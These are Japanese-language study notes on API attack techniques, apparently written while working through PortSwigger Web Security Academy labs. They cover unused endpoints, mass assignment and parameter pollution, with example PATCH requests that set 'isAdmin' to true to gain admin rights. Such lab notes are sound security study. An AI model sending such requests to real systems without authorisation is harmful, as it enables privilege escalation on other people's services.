###### 使用されてないエンドポイントを悪用する

- [🔍API testing](🔍API%20testing.md#有効なHTTPリクエスト作成のためのAPIエンドポイントについての調査)で発見したHTTPメソッドや`Content-Type`を使用して任意の値に変更する

[Lab: Finding and exploiting an unused API endpoint](https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint)

---
## Mass assignmentを利用したPrivEsc

- Mass assignment = 隠しパラメタ or 他のエンドポイントへのリクエストに使用されるパラメタを使用して攻撃者の意図する値に変更されること

1. あるAPIエンドポイントへのリクエストorレスポンスのパラメタを観察する
```json
{ 
	"username": "wiener", 
	"email": "wiener@example.com", 
}
```

2. 同様に、他のAPIエンドポイントへのリクエストorレスポンスのパラメタを観察する
```json
{ 
	"id": 123, 
	"name": "John Doe", 
	"email": "john@example.com", 
	"isAdmin": "false" 
}
```

3. `PATCH`メソッド or `POST`メソッドリクエストで、他のエンドポイントで使用されているパラメタを使ってみる

- まずは正常な値を入力し、エラーが返らないか確認する
```http
PATCH /api/users/
...

{ 
	"username": "wiener", 
	"email": "wiener@example.com", 
	"isAdmin": false, 
}
```

- 次に、適当な値を入力し、エラーが返るか確認する。エラーが返る＝パラメタを正常に更新できている
```http
...
	"isAdmin": hogehoge, 
}
```

4. パラメタの値を改変しリクエスト。PrivEsc完了
```http
PATCH /api/users/
...

{ 
	"username": "wiener", 
	"email": "wiener@example.com", 
	"isAdmin": true, 
}
```

[Lab: Exploiting a mass assignment vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)

---
## Server-side parameter pollution

- パスワードリセット
- [2. クエリとして内部APIへ送信するストリングのテスト](4.%20Server-sideパラメタ汚染/2.%20クエリとして内部APIへ送信するストリングのテスト.md#Server-side%20parameter%20pollution)

[Lab: Exploiting server-side parameter pollution in a query string](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string)

---
## Expert: REST pathのテスト(可能性低)

- [3. REST pathのテスト](4.%20Server-sideパラメタ汚染/3.%20REST%20pathのテスト.md)

